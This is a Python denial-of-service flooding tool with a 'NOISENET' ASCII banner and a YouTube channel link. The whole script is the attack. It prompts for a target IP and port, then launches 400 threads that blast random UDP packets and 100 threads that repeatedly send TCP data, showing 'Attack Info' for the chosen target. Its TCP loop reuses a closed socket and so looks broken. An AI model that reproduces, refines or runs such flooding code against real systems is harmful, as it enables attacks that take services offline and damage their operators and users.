import time
import os
import socket
import threading

def udpflood(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  raw = os.urandom(1024)
  payload = b'\xfe' + raw
  while True:
    s.sendto(payload, (ip, port))

def tcpflood(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  raw = os.urandom(128)
  while True:
    s.connect((ip, port))
    s.send(raw)
    time.sleep(0.1)
    s.close()


banner = """                                                                                                                                                                         ███▄    █  ▒█████   ██▓  ██████ ▓█████  ███▄    █ ▓█████▄▄▄█████▓
 ██ ▀█   █ ▒██▒  ██▒▓██▒▒██    ▒ ▓█   ▀  ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██  ▀█ ██▒▒██░  ██▒▒██▒░ ▓██▄   ▒███   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▓██▒  ▐▌██▒▒██   ██░░██░  ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░
▒██░   ▓██░░ ████▓▒░░██░▒██████▒▒░▒████▒▒██░   ▓██░░▒████▒ ▒██▒ ░
░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░
░ ░░   ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░   ░
   ░   ░ ░ ░ ░ ░ ▒   ▒ ░░  ░  ░     ░      ░   ░ ░    ░    ░
         ░     ░ ░   ░        ░     ░  ░         ░    ░  ░


"""

os.system("clear")
print("\033[1;34m" + banner)
print(">> https://youtube.com/@lolokooPE")
print(" ")
time.sleep(1)
ip = input("Enter IP: ")
port = int(input("Enter Port: "))
time.sleep(3)
os.system("clear")
print(banner)
print(" ")
print("Attack Info")
print(" ")
print("\033[33m--------------------")
print(" ")
print(f"\033[31mTARGET IP: {ip}")
print(f"\033[31mTARGET PORT: {port}")
print("Use CTRL+C For Stop")
print(" ")
print("\033[33m--------------------")

for i in range(400):
  t = threading.Thread(target=udpflood,args=(ip, port), daemon=True)
  t.start()
for i in range(100):
  t2 = threading.Thread(target=tcpflood,args=(ip, port), daemon=True)
  t2.start()

while True:
  time.sleep(1)







